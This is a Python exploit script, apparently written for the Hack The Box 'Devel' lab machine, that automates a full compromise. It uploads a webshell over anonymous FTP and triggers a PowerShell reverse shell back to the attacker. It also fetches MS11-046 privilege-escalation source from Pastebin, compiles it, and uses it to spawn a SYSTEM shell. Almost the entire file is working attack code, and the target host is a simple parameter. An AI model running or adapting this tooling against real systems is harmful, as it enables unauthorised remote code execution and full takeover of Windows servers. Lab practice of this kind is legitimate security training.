# -*- coding: utf-8 -*-

# Devel HTB FTP Upload + RCE + Priv Esc
# CVE: MS11-046 (Priv Esc)
# Exploit author: Renan Almeida a.k.a. nullarmor
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import fileinput
import os
import random
import string
import sys
from ftplib import FTP
from pwn import *
import requests


def main():
    
    # args
    argparser = argparse.ArgumentParser(description='Devel HTB FTP Upload + RCE + Priv Esc', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
    
    main_arg.add_argument('--rhost', type=str,
                            help='Victim host', 
                            required=True)
                            
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
    
    # cons
    rhost = args.rhost
    lhost = args.lhost
    lport = args.lport
    
    
    def string_generator():
        letters = string.ascii_letters
        return ''.join(random.choice(letters) for i in range(8))
    
    def generate_c_exploit():
        
        print(" [*] Getting MS11-046 source code from Pastebin and saving on local directory...")
        
        try:
            ms11_046_sc = requests.get("https://pastebin.com/raw/cBbEyiv7").text
            
            with open('{}.c'.format(randname),'w') as f:
                f.write(ms11_046_sc.replace('LHOST', lhost).replace('LPORT', str(int(lport)+1)))
                f.close()
        
        except Exception as e:
            print(e)
            print(" [*] Failed to retrieve MS11-046 source code!")
            sys.exit(1)
        
        else:
            print(" [*] MS11-046 file saved: {}.c".format(randname))
            print(" [*] Compiling using i686-w64-mingw32-gcc...")
            
            try:
                os.system("i686-w64-mingw32-gcc {}.c -o {}.exe -lws2_32".format(randname, randname))
            
            except Exception as e:
                print(e)
                print(" [*] Failed to compile the exploit :(")
                sys.exit(1)
            
            else:
                print(" [*] Exploit compiled with success!")
                return True
            
            
    def generate_aspx_revshell():
        global ps_payload
        
        print(" [*] Generate malicious ASPX reverse shell file...")
        
        ps_payload = 'powershell -nop -exec bypass -c "'
        ps_payload += "$client = New-Object System.Net.Sockets.TCPClient('"+lhost+"',"+lport+");"
        ps_payload += "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
        ps_payload += "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
        ps_payload += "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        ps_payload += "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        ps_payload += "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        ps_payload += '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
        
        aspx_revshell_payload = '''
            <%@ Page Language="C#" Debug="true" Trace="false" %>
            <%@ Import Namespace="System.Diagnostics" %>
            <%@ Import Namespace="System.IO" %>
            <script Language="c#" runat="server">
            void Page_Load(object sender, EventArgs e)
            {
            }
            string ExcuteCmd(string arg)
            {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c "+arg;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            StreamReader stmrdr = p.StandardOutput;
            string s = stmrdr.ReadToEnd();
            stmrdr.Close();
            return s;
            }
            void cmdExe_Click(object sender, System.EventArgs e)
            {
            Response.Write("<pre>");
            Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
            Response.Write("</pre>");
            }
            </script>
            <HTML>
            <HEAD>
            <title>awen asp.net webshell</title>
            </HEAD>
            <body >
            <form id="cmd" method="post" runat="server">
            <asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
            <asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
            <asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
            </form>
            </body>
            </HTML>
        '''
        
        try:
            with open('/tmp/{}.aspx'.format(randname),'w') as f:
                f.write(aspx_revshell_payload)
                f.close()
        
        except Exception as e:
            print(e)
            print(" [*] Failed to build the reverse shell file :(")
            sys.exit(1)
        
        else:
            print(" [*] Reverse shell file generated with success!")
            return True
            
                    
    def reverse_shell(l):
        
        print(" [*] Spawning the initial reverse shell and doing the privilege escalation to SYSTEM...")
        
        try:
            l.sendline("""whoami""")
            l.sendline("""c:\\inetpub\\wwwroot\\{}.exe""".format(randname))
        except Exception as e:
            print(e)
            print(" [*] Privilege escalation failed!")
            sys.exit(1)
        else:
            l.close()
            
            print(" [*] Spawning the second reverse shell with SYSTEM privileges...")
            
            try:
                l = listen(str(int(lport) + 1))
                l.sendline("""whoami""")
                l.interactive()
            except:
                print(" [*] SYSTEM shell failed!")
                sys.exit(1)
                
                    
    def ftp_upload(file_):
        
        ftp = FTP()
        ftp.set_debuglevel(0)
        
        # login
        print(" [*] Connecting to FTP server through anonymous access...")
        
        try:
            ftp.connect(rhost, 21) 
            ftp.login('anonymous','anonymous')
        except Exception as e:
            print(e)
            print(" [*] Failed to connect to FTP server!")
            sys.exit(1)
        
        # aspx reverse shell upload
        print( " [*] Uploading {} file to FTP server...".format(file_))
        
        try:
            fp = open(file_, 'rb')
            ftp.storbinary('STOR %s' % os.path.basename(file_), fp, 1024)
            fp.close()
        
        except Exception as e:    
            print(e)
            print(" [*] Failed to upload the malicious file to FTP server :(")
            sys.exit(1)
        
        else:
            if '.exe' in file_:
                print(" [*] Exploit uploaded to FTP")
            else:
                print(" [*] ASPX Webshell file uploaded to http://{}/{}.aspx".format(rhost, randname))
            
            return True
    
    def trigger_aspx_exploit():
        global ps_payload, l
        
        sess = requests.Session()
        
        print(" [*] Grabbing some ASP session parameters...")
        
        try:
            r = sess.get("http://{}/{}.aspx".format(rhost, randname))
            aspx_viewstate = r.text.split('__VIEWSTATE" value="')[1].split('" />')[0]
            aspx_eventvalidation = r.text.split('__EVENTVALIDATION" value="')[1].split('" />')[0]
        
        except Exception as e:
            print(e)
            print(" [*] Failed to grab ASP session parameters :(")
            sys.exit(1)
        
        else:
            
            print(" [*] Triggering the reverse webshell and setting the listening...")
            
            params = {
                "__VIEWSTATE": aspx_viewstate,
                "__EVENTVALIDATION": aspx_eventvalidation,
                "txtArg": ps_payload,
                "testing": "excute"
            }
        
            l = listen(lport)
            
            try:
                r = sess.post("http://{}/{}.aspx".format(rhost, randname), data=params, timeout=2)
            except:
                #pass
                reverse_shell(l)
            
    
    # main 
    print(" [>] Devel HTB FTP Upload + RCE + Priv Esc")
    print(" [*] Python script exploit author: nullarmor")
    
    randname = string_generator()
    aspx_revshell_path = '/tmp/{}.aspx'.format(randname)
    
    if generate_c_exploit():
        if ftp_upload("{}.exe".format(randname)):
            if generate_aspx_revshell():
                if ftp_upload(aspx_revshell_path):
                    trigger_aspx_exploit()

if __name__ == "__main__":
    main()
